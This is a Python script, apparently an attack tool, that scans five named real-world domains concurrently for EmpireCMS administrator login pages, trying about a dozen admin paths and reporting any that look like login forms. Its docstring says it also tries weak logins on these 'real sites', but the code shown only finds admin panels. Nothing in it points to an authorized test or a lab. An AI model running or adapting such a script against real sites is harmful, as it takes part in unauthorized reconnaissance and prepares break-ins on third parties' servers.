#!/usr/bin/env python3
"""EmpireCMS admin path brute + weak login on 5 real sites"""
import urllib.request, urllib.parse, re, http.cookiejar
from concurrent.futures import ThreadPoolExecutor, as_completed

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}

def fetch(url, timeout=8, data=None, op=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"} if data else UA)
        r = (op or urllib.request).open(req, timeout=timeout)
        return r.status, r.read(80000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(3000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def probe(d):
    scheme = "https://" if d in ("china-qualityinspection.com", "dhyindustry.com", "uy-mold.com", "treasurebeingyou.com") else "http://"
    out = [d]
    # empire admin path variants
    paths = ["/e/admin/login.php", "/e/admin/index.php", "/e/admin/", "/e/AdminLogin.php",
             "/e/manage/", "/e/manager/", "/ecms/admin/", "/admin/ecms.php", "/e/admin/ecmsadmin.php",
             "/e/admin/AdminLogin.php", "/e/adminadmin.php"]
    for p in paths:
        code, body = fetch(scheme + d + p)
        if code == 200 and ("login" in body.lower() or "username" in body.lower() or "密码" in body or "验证码" in body):
            out.append("ADMIN: %s (size=%d)" % (p, len(body)))
            break
    return out

doms = ["treasurebeingyou.com", "sdgbgg.com", "china-qualityinspection.com", "uy-mold.com", "dhyindustry.com"]
with ThreadPoolExecutor(max_workers=5) as ex:
    futs = {ex.submit(probe, d): d for d in doms}
    for fut in as_completed(futs):
        print(" | ".join(fut.result()), flush=True)
